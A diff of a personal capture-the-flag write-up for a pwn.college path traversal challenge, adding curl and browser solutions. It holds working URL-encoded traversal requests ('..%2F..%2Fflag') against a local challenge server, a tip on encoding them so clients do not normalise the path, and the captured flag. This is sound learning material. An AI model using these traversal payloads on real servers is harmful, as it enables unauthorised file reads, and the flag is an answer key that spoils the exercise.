@@ -6,6 +6,7 @@
 ---
 
 ## ✅ what i did  
+I WAY -> nc
 -clicked start
 -opened the terminal
 -ran: 'cat /challenge/server'
@@ -24,10 +25,27 @@ if nothing is provided after /deliverables, by default it will use index.html
 the requested_path=/challenge/files/../../flag is resolved in -> /flag    (../../ eliminates /challenge and /files)
 -flag popped out
 
+II WAY -> curl
+-clicked start
+-opened the terminal
+-ran: '/challenge/server'
+-ran: 'curl -v "http://challenge.localhost/deliverbales/..%2F..%2F/flag"'
+-flag popped out
+
+III WAY -> browser
+-clicked start
+-opened the desktop
+-opened the terminal
+-ran: '/challenge/server'
+-opened firefox
+-url: "http://challenge.localhost:80/deliverables/..%2F..%2Fflag"
+-flag popped out
+
 ## 🧑🏾‍🏫 what this challenge teaches u
 how to read server's code and retrieve the correct vulnerablity to exploit
 in this case <path:path> accepts arbitrary subpaths
 app.root_path is the full path in which server's code exist
+to avoid curl or browser to execute ../ before sending the request, use url encoding: / -> %2F    ../ -> ..%2F
 
 ## 🏁 Flag  
 pwn.college{kfk1hZNut7C5qzaFnlbIOkQPPDt.QX3gzMzwCO4IDOxEzW}
